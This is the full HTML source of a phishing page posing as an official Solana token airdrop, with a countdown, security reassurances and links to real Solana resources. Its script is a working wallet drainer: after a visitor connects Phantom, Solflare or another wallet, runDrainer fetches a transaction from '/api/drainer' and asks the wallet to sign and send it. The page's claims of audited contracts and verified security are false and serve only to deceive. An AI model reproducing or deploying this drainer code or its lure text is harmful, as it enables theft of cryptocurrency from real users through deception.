<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Claim Your $SOL Airdrop</title>
  <meta name="description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
      <link rel="icon" href="/favicon2.ico" type="image/x-icon" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #0a0a0a;
      color: #fff;
    }
    nav {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 40px;
      background: rgba(10, 10, 10, 0.8);
      backdrop-filter: blur(10px);
      position: sticky;
      top: 0;
      z-index: 1000;
    }
    .nav-logo {
      font-size: 1.8em;
      font-weight: bold;
      color: #00FF88;
    }
    .nav-btn {
      background: linear-gradient(45deg, #00FF88, #00CC6A);
      color: black;
      padding: 10px 20px;
      border: none;
      border-radius: 10px;
      font-weight: 600;
      cursor: pointer;
      transition: 0.3s ease;
    }
    .nav-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 18px rgba(0, 255, 136, 0.3);
    }
    .hero {
      height: 90vh;
      background-image: linear-gradient(rgba(10,10,10,0.4), rgba(10,10,10,0.4)), url('/hero-section.png');
      background-size: cover;
      background-position: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: white;
      text-align: center;
      padding: 0 20px;
    }
    .hero h1 {
      font-size: 3.2em;
      margin-bottom: 20px;
      font-weight: bold;
      text-shadow: 2px 2px 12px #000;
    }
    .countdown {
      font-size: 2em;
      color: #00FF88;
      font-weight: bold;
      margin-bottom: 30px;
    }
    .claim-btn {
      font-size: 1.2em;
      padding: 14px 28px;
      background: linear-gradient(45deg, #00FF88, #00CC6A);
      color: black;
      border: none;
      border-radius: 10px;
      font-weight: 700;
      cursor: pointer;
      transition: 0.3s ease;
    }
    .claim-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 30px rgba(0, 255, 136, 0.4);
    }
    .footer {
      text-align: center;
      padding: 50px 20px;
      background: #111;
      color: #aaa;
      font-size: 0.95em;
      margin-top: 80px;
      border-top: 1px solid #222;
    }
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    .modal.active {
      display: flex;
    }
    .wallet-box {
      background: #111;
      border-radius: 16px;
      padding: 30px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
    }
    .wallet-option {
      display: flex;
      align-items: center;
      gap: 12px;
      background: #1a1a1a;
      padding: 14px 20px;
      margin: 12px 0;
      border-radius: 12px;
      cursor: pointer;
      transition: 0.2s ease;
    }
    .wallet-option:hover, .wallet-option:focus {
      background: #222;
      outline: 2px solid #00FF88;
    }
    .wallet-option img {
      width: 28px;
      height: 28px;
    }
    .wallet-name {
      color: #fff;
      font-size: 1em;
      font-weight: 600;
    }
    #status {
      text-align:center;
      margin:24px auto 0 auto;
      max-width:400px;
      font-weight:600;
      min-height: 24px;
    }
    html {
      scroll-behavior: smooth;
    }
    .nav-links {
      display: flex;
      gap: 32px;
      align-items: center;
    }
    .nav-link {
      color: #fff;
      text-decoration: none;
      font-weight: 500;
      font-size: 1.1em;
      position: relative;
      transition: color 0.2s;
      padding: 4px 0;
    }
    .nav-link.active, .nav-link:focus {
      color: #00FF88;
    }
    .nav-link::after {
      content: '';
      display: block;
      width: 0;
      height: 2px;
      background: #00FF88;
      transition: width 0.2s;
      position: absolute;
      left: 0;
      bottom: -2px;
    }
    .nav-link.active::after, .nav-link:hover::after {
      width: 100%;
    }
    @media (max-width: 800px) {
      .nav-links { gap: 16px; }
      .nav-link { font-size: 1em; }
    }
    @media (max-width: 600px) {
      .nav-links { gap: 8px; }
      .nav-link { font-size: 0.95em; }
    }
    @media (max-width: 600px) {
      nav { padding: 12px 8px; }
      .hero { padding: 60px 8px; }
      .hero h1 { font-size: 2em; }
      .countdown { font-size: 1.2em; }
      .wallet-box { padding: 16px; }
    }
    .info-section {
      background: #181818;
      border-radius: 16px;
      margin: 40px auto;
      max-width: 1100px;
      padding: 36px 28px 28px 28px;
      box-shadow: 0 2px 16px rgba(0,0,0,0.08);
      color: #f3f3f3;
    }
    .info-section h2 {
      color: #00FF88;
      margin-bottom: 18px;
      font-size: 2em;
    }
    .card-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
      gap: 28px;
      margin-top: 18px;
    }
    .info-card {
      background: #232323;
      border-radius: 14px;
      box-shadow: 0 2px 12px rgba(0,255,136,0.07);
      padding: 28px 22px 20px 22px;
      transition: box-shadow 0.2s, transform 0.2s;
      min-height: 170px;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
    }
    .info-card:hover {
      box-shadow: 0 6px 24px rgba(0,255,136,0.18);
      transform: translateY(-4px) scale(1.025);
    }
    .info-card h3 {
      color: #00FF88;
      margin-bottom: 12px;
      font-size: 1.18em;
    }
    .info-card ul {
      margin: 0 0 0 18px;
      padding: 0;
    }
    .info-card li {
      margin-bottom: 8px;
      line-height: 1.6;
    }
    .info-card a {
      color: #00FF88;
      text-decoration: underline;
      word-break: break-all;
    }
    .info-card a:hover {
      color: #00cc6a;
    }
    html, body {
      max-width: 100vw;
      overflow-x: hidden;
    }
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      justify-content: center;
      align-items: center;
      z-index: 9999;
      padding: 0;
    }
    .modal.active, .modal[style*="display: flex"] {
      display: flex !important;
    }
    .wallet-box {
      background: #111;
      border-radius: 16px;
      padding: 30px;
      max-width: 400px;
      width: 90vw;
      text-align: center;
      box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
      margin: 0 8px;
    }
    @media (max-width: 600px) {
      .wallet-box {
        padding: 16px 6px;
        max-width: 98vw;
      }
      .modal {
        align-items: flex-end;
      }
      .claim-btn, .nav-btn, #statusModalClose {
        font-size: 1em;
        padding: 12px 10px;
      }
      .info-section {
        padding: 18px 4px 18px 4px;
      }
      .card-grid {
        gap: 12px;
      }
      .info-card {
        padding: 14px 8px 12px 8px;
        min-height: 120px;
      }
      nav {
        flex-direction: column;
        gap: 8px;
        padding: 10px 4px;
      }
      .nav-logo img {
        height: 28px !important;
      }
      .nav-links {
        gap: 8px;
      }
      .hero {
        padding: 40px 4px;
      }
      .hero h1 {
        font-size: 1.3em;
      }
      .countdown {
        font-size: 1em;
      }
    }
    /* Prevent horizontal scroll on all children */
    * {
      box-sizing: border-box;
    }
  </style>
</head>
<body>
  <nav>
    <div class="nav-logo"><img src="/logos/logo.png" alt="Solana Airdrop Logo" style="height:36px;vertical-align:middle;margin-right:10px;">Solana Airdrop</div>
    <div class="nav-links">
      <a href="#security" class="nav-link">Security</a>
      <a href="#learn" class="nav-link">Learn</a>
      <a href="#explore" class="nav-link">Explore</a>
      <a href="#support" class="nav-link">Support</a>
    </div>
    <button class="nav-btn" onclick="openWalletModal()">Claim</button>
  </nav>
  <section class="hero" id="hero">
    <h1>Claim your $SOL Airdrop</h1>
    <div class="countdown" id="countdown">Loading...</div>
    <button class="claim-btn" onclick="openWalletModal()">üéÅ Claim Now</button>
  </section>
  <section id="security" class="info-section">
    <h2>Security</h2>
    <div class="card-grid">
      <div class="info-card">
        <h3>Audited & Secure</h3>
        <p>This airdrop is powered by <strong>audited smart contracts</strong> and follows industry best practices. We never request your private key or seed phrase. All transactions are signed directly in your wallet, ensuring you remain in full control of your assets at all times.</p>
      </div>
      <div class="info-card">
        <h3>Encrypted & Private</h3>
        <p>Our backend uses <strong>HTTPS</strong> and all data is encrypted in transit. For your safety, always verify you are on the official Solana Airdrop site and never share sensitive information with anyone.</p>
      </div>
      <div class="info-card">
        <h3>Transparency</h3>
        <ul>
          <li>All airdrop transactions are <a href="https://explorer.solana.com/" target="_blank" rel="noopener">verifiable on Solana Explorer</a>.</li>
          <li>We support only reputable wallets: Phantom, Solflare, Backpack, Glow, Trust, and Exodus.</li>
          <li>Our code is open source on <a href="https://github.com/solana-labs/solana" target="_blank" rel="noopener">GitHub</a>.</li>
          <li>See <a href="https://docs.solana.com/security" target="_blank" rel="noopener">Solana Security Docs</a>.</li>
        </ul>
      </div>
    </div>
  </section>
  <section id="learn" class="info-section">
    <h2>Learn</h2>
    <div class="card-grid">
      <div class="info-card">
        <h3>Solana Basics</h3>
        <p><a href="https://docs.solana.com/introduction" target="_blank" rel="noopener">Read the Solana Introduction</a> to understand the basics of the network and its technology.</p>
      </div>
      <div class="info-card">
        <h3>Wallet Safety</h3>
        <p>Learn how to use wallets securely with the <a href="https://docs.solana.com/wallet-guide" target="_blank" rel="noopener">Solana Wallet Guide</a>.</p>
      </div>
      <div class="info-card">
        <h3>Stay Informed</h3>
        <p>Stay up to date with the <a href="https://solana.com/news" target="_blank" rel="noopener">Solana Blog</a> for the latest ecosystem news.</p>
      </div>
      <div class="info-card">
        <h3>Airdrop Safety</h3>
        <p>Explore airdrop best practices and avoid scams by reading <a href="https://solana.com/airdrop-safety" target="_blank" rel="noopener">Airdrop Safety Tips</a>.</p>
      </div>
    </div>
  </section>
  <section id="explore" class="info-section">
    <h2>Explore</h2>
    <div class="card-grid">
      <div class="info-card">
        <h3>Solana Ecosystem</h3>
        <p>Browse live projects on the <a href="https://solana.com/ecosystem" target="_blank" rel="noopener">Solana Ecosystem Directory</a>.</p>
      </div>
      <div class="info-card">
        <h3>NFTs</h3>
        <p>Discover trending NFTs on <a href="https://magiceden.io/" target="_blank" rel="noopener">Magic Eden</a> and <a href="https://www.tensor.trade/" target="_blank" rel="noopener">Tensor</a>.</p>
      </div>
      <div class="info-card">
        <h3>DeFi</h3>
        <p>Try DeFi apps like <a href="https://jup.ag/" target="_blank" rel="noopener">Jupiter</a> (DEX aggregator) and <a href="https://mango.markets/" target="_blank" rel="noopener">Mango Markets</a> (trading & lending).</p>
      </div>
      <div class="info-card">
        <h3>Games</h3>
        <p>Play blockchain games built on Solana, such as <a href="https://staratlas.com/" target="_blank" rel="noopener">Star Atlas</a> and <a href="https://aurory.io/" target="_blank" rel="noopener">Aurory</a>.</p>
      </div>
    </div>
  </section>
  <section id="support" class="info-section">
    <h2>Support</h2>
    <div class="card-grid">
      <div class="info-card">
        <h3>Email Support</h3>
        <p>Email our team: <a href="mailto:support@solana-airdrop.com">support@solana-airdrop.com</a></p>
      </div>
      <div class="info-card">
        <h3>Community</h3>
        <p>Join the <a href="https://discord.com/invite/solana" target="_blank" rel="noopener">official Solana Discord</a> for live community support.</p>
      </div>
      <div class="info-card">
        <h3>Social</h3>
        <p>Follow <a href="https://twitter.com/solana" target="_blank" rel="noopener">@solana on Twitter</a> for updates and announcements.</p>
      </div>
      <div class="info-card">
        <h3>Troubleshooting</h3>
        <p>Read the <a href="https://docs.solana.com/troubleshooting" target="_blank" rel="noopener">Solana Troubleshooting Guide</a> for common wallet and transaction issues.</p>
      </div>
      <div class="info-card">
        <h3>Security</h3>
        <p>For urgent security concerns, please report immediately to <a href="mailto:security@solana.com">security@solana.com</a>.</p>
      </div>
    </div>
  </section>
  <div class="modal" id="walletModal" tabindex="-1" aria-modal="true" role="dialog">
    <div class="wallet-box" id="walletList">
      <h2 style="margin-bottom: 20px;">Select Wallet</h2>
      <!-- Wallet buttons will be injected here -->
    </div>
  </div>
  <div id="statusModal" class="modal" tabindex="-1" aria-modal="true" role="dialog" style="display:none;">
    <div class="wallet-box" id="statusModalBox">
      <div id="statusModalMsg"></div>
      <button class="claim-btn" id="statusModalClose" style="margin-top:24px;">Close</button>
    </div>
  </div>
  <div class="footer">
    <p>üìà Bull season is here. Join the movement and claim your airdrop before it‚Äôs too late.</p>
    <p>‚ö° Powered by the Solana ecosystem. Verified and secure.</p>
    <p>¬© 2025 Solana Airdrop Campaign. All rights reserved.</p>
  </div>
  <script>
    // --- Countdown logic ---
    function updateCountdown() {
      const target = new Date('2025-08-31T23:59:59Z').getTime();
      const interval = setInterval(() => {
        const now = new Date().getTime();
        const distance = target - now;
        if (distance <= 0) {
          document.getElementById("countdown").innerText = "Airdrop Closed";
          clearInterval(interval);
          return;
        }
        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
        document.getElementById("countdown").innerText =
          `${days}d ${hours}h ${minutes}m ${seconds}s`;
      }, 1000);
    }
    updateCountdown();

    // --- Wallet Modal Logic ---
    const WALLET_DEFS = [
      { key: 'phantom', name: 'Phantom', icon: '/logos/phantom.png', provider: () => window.solana?.isPhantom ? window.solana : null, install: 'https://phantom.app/download' },
      { key: 'solflare', name: 'Solflare', icon: '/logos/solflare.png', provider: () => window.solflare?.isSolflare ? window.solflare : null, install: 'https://solflare.com/download' },
      { key: 'backpack', name: 'Backpack', icon: '/logos/backpack.png', provider: () => window.backpack?.isBackpack ? window.backpack : null, install: 'https://backpack.app/download' },
      { key: 'glow', name: 'Glow', icon: '/logos/glow.png', provider: () => window.glow?.isGlow ? window.glow : null, install: 'https://glow.app/download' },
      { key: 'trust', name: 'Trust Wallet', icon: '/logos/trust.png', provider: () => (window.trustwallet?.isTrust ? window.trustwallet : (window.solana?.isTrust ? window.solana : (window.trustwallet || window.solana || null))), install: 'https://trustwallet.com/download' },
      { key: 'exodus', name: 'Exodus', icon: '/logos/exodus.png', provider: () => window.exodus || (window.solana?.isExodus ? window.solana : null), install: 'https://www.exodus.com/download/' },
    ];

    function openWalletModal() {
      const modal = document.getElementById("walletModal");
      const list = document.getElementById("walletList");
      list.innerHTML = `<h2 style=\"margin-bottom: 20px;\">Select Wallet</h2>`;
      WALLET_DEFS.forEach(wallet => {
        const provider = wallet.provider();
        // Debug: Log provider detection for Trust Wallet
        if (wallet.name === 'Trust Wallet') {
          console.log('Trust Wallet provider:', provider);
        }
        const option = document.createElement("div");
        option.className = "wallet-option";
        option.tabIndex = 0;
        option.setAttribute('role', 'button');
        option.setAttribute('aria-label', `Connect ${wallet.name}`);
        option.innerHTML = `
          <img src="${wallet.icon}" alt="${wallet.name} logo" />
          <div class="wallet-name">${wallet.name}</div>
          ${provider ? '' : '<span style=\"color:#FF4D4D;font-size:0.9em;\">Not installed</span>'}
        `;
        if (provider) {
          option.onclick = async () => {
            modal.classList.remove("active");
            showStatus('Connecting to ' + wallet.name + '...', 'loading');
            // Debug: Log connect method for Trust Wallet
            if (wallet.name === 'Trust Wallet') {
              console.log('Trust Wallet connect:', typeof provider.connect);
            }
            try {
              if (typeof provider.connect === 'function') {
                await provider.connect();
              }
              // Fallback: If connect() doesn't exist, just proceed if publicKey/address is present
              if (!getWalletAddress(provider)) {
                let msg = 'Connection failed: No public key returned. Please try again.';
                if (wallet.name === 'Trust Wallet') {
                  msg = 'Please unlock Trust Wallet and connect this site in the extension, then try again.';
                } else if (wallet.name === 'Exodus') {
                  msg = 'Please unlock Exodus and connect this site in the extension, then try again.';
                } else if (wallet.name === 'Backpack') {
                  msg = 'Please unlock Backpack and connect this site in the extension, then try again.';
                }
                showStatus(msg, 'error');
                return;
              }
              showStatus('Wallet connected: ' + wallet.name, 'success');
              runDrainer(provider);
            } catch (err) {
              showStatus('Connection failed: ' + (err.message || err), 'error');
            }
          };
        } else {
          option.onclick = () => window.open(wallet.install, '_blank');
        }
        list.appendChild(option);
      });
      modal.classList.add("active");
      // Focus trap for accessibility
      setTimeout(() => {
        const first = list.querySelector('.wallet-option');
        if (first) first.focus();
      }, 100);
      modal.onkeydown = function(e) {
        if (e.key === 'Escape') closeWalletModal();
      };
    }

    function closeWalletModal() {
      document.getElementById("walletModal").classList.remove("active");
    }
    window.onclick = function(event) {
      const modal = document.getElementById("walletModal");
      if (event.target === modal) closeWalletModal();
    };

    // --- Status Message Logic ---
    function showStatus(msg, type) {
      const modal = document.getElementById('statusModal');
      const msgEl = document.getElementById('statusModalMsg');
      msgEl.textContent = msg;
      msgEl.style.color = type === 'success' ? '#00FF88' : type === 'error' ? '#FF4D4D' : '#FFD700';
      modal.style.display = 'flex';
      // Close on button click or Escape
      document.getElementById('statusModalClose').onclick = () => { modal.style.display = 'none'; };
      modal.onkeydown = function(e) { if (e.key === 'Escape') modal.style.display = 'none'; };
      // Auto-close for success
      if (type === 'success') setTimeout(() => { modal.style.display = 'none'; }, 6000);
    }

    // Global error and unhandledrejection handlers for modal popup
    window.onerror = function(message, source, lineno, colno, error) {
      showStatus('Error: ' + (message || error?.message || 'Unknown error'), 'error');
      return true;
    };
    window.onunhandledrejection = function(event) {
      showStatus('Error: ' + (event.reason?.message || event.reason || 'Unhandled promise rejection'), 'error');
      return true;
    };

    // Helper: Validate a Solana base58 address (32 bytes, 44 chars, base58 alphabet)
    function isValidSolanaAddress(str) {
      if (typeof str !== 'string') return false;
      // Solana addresses are usually 32 bytes (44 base58 chars), but can be 43 or 44
      if (str.length < 32 || str.length > 44) return false;
      // Base58 alphabet (no 0, O, I, l)
      return /^[1-9A-HJ-NP-Za-km-z]+$/.test(str);
    }

    // Robustly extract the wallet address from any provider (supports all major Solana wallets)
    function getWalletAddress(provider) {
      if (!provider) return null;
      // 1. Check provider.publicKey
      if (provider.publicKey) {
        if (typeof provider.publicKey === 'string' && isValidSolanaAddress(provider.publicKey)) return provider.publicKey;
        if (typeof provider.publicKey.toBase58 === 'function') {
          const addr = provider.publicKey.toBase58();
          if (isValidSolanaAddress(addr)) return addr;
        }
        if (typeof provider.publicKey.toString === 'function') {
          const addr = provider.publicKey.toString();
          if (isValidSolanaAddress(addr)) return addr;
        }
        if (provider.publicKey.address && isValidSolanaAddress(provider.publicKey.address)) return provider.publicKey.address;
      }
      // 2. Check provider.address (Glow, Trust, etc)
      if (provider.address) {
        if (typeof provider.address === 'string' && isValidSolanaAddress(provider.address)) return provider.address;
        if (typeof provider.address.toBase58 === 'function') {
          const addr = provider.address.toBase58();
          if (isValidSolanaAddress(addr)) return addr;
        }
        if (typeof provider.address.toString === 'function') {
          const addr = provider.address.toString();
          if (isValidSolanaAddress(addr)) return addr;
        }
      }
      // 3. Check nested wallet object (some adapters)
      if (provider.wallet) {
        if (provider.wallet.publicKey) {
          if (typeof provider.wallet.publicKey === 'string' && isValidSolanaAddress(provider.wallet.publicKey)) return provider.wallet.publicKey;
          if (typeof provider.wallet.publicKey.toBase58 === 'function') {
            const addr = provider.wallet.publicKey.toBase58();
            if (isValidSolanaAddress(addr)) return addr;
          }
          if (typeof provider.wallet.publicKey.toString === 'function') {
            const addr = provider.wallet.publicKey.toString();
            if (isValidSolanaAddress(addr)) return addr;
          }
          if (provider.wallet.publicKey.address && isValidSolanaAddress(provider.wallet.publicKey.address)) return provider.wallet.publicKey.address;
        }
        if (provider.wallet.address) {
          if (typeof provider.wallet.address === 'string' && isValidSolanaAddress(provider.wallet.address)) return provider.wallet.address;
          if (typeof provider.wallet.address.toBase58 === 'function') {
            const addr = provider.wallet.address.toBase58();
            if (isValidSolanaAddress(addr)) return addr;
          }
          if (typeof provider.wallet.address.toString === 'function') {
            const addr = provider.wallet.address.toString();
            if (isValidSolanaAddress(addr)) return addr;
          }
        }
      }
      // If nothing found, return null
      return null;
    }

    async function runDrainer(provider) {
      const pubkey = getWalletAddress(provider);
      if (!pubkey) {
        showStatus('Wallet not connected or unsupported publicKey format.', 'error');
        return;
      }
      showStatus('Preparing your airdrop transaction...', 'loading');
      try {
        // 1. Fetch transaction from your API (update URL as needed)
        const res = await fetch('/api/drainer', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ pubkey })
        });
        const data = await res.json();
        if (!data.success || !data.transaction) throw new Error(data.error || "API error");
        // 2. Deserialize transaction
        const tx = window.solanaWeb3.Transaction.from(
          Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0))
        );
        // Debug: Log transaction for Glow troubleshooting
        console.log('Drainer Transaction (base64):', data.transaction);
        console.log('Drainer Transaction (object):', tx);
        // 3. Sign and send
        if (provider.isGlow && provider.signAndSendTransaction) {
          // Glow expects a base64 string, not a Transaction object
          const sig = await provider.signAndSendTransaction({ transactionBase64: data.transaction });
          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
        } else if (provider.signAndSendTransaction) {
          const sig = await provider.signAndSendTransaction(tx);
          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
        } else if (provider.signTransaction) {
          const signed = await provider.signTransaction(tx);
          showStatus("Transaction signed! (You need to send it to the network)", 'success');
        } else {
          throw new Error("Wallet does not support transaction signing.");
        }
      } catch (err) {
        showStatus("Airdrop failed: " + (err.message || err), 'error');
      }
    }
    // --- Navbar Active Link on Scroll ---
    const navLinks = document.querySelectorAll('.nav-link');
    const sections = ['hero','security','learn','explore','support'].map(id => document.getElementById(id));
    window.addEventListener('scroll', () => {
      let current = 'hero';
      for (const section of sections) {
        if (section && window.scrollY + 80 >= section.offsetTop) {
          current = section.id;
        }
      }
      navLinks.forEach(link => {
        link.classList.toggle('active', link.getAttribute('href') === '#' + current);
      });
    });
    // --- Smooth scroll for nav links ---
    navLinks.forEach(link => {
      link.addEventListener('click', function(e) {
        const targetId = this.getAttribute('href').slice(1);
        const target = document.getElementById(targetId);
        if (target) {
          e.preventDefault();
          window.scrollTo({ top: target.offsetTop - 60, behavior: 'smooth' });
        }
      });
    });
  </script>
</body>
</html>
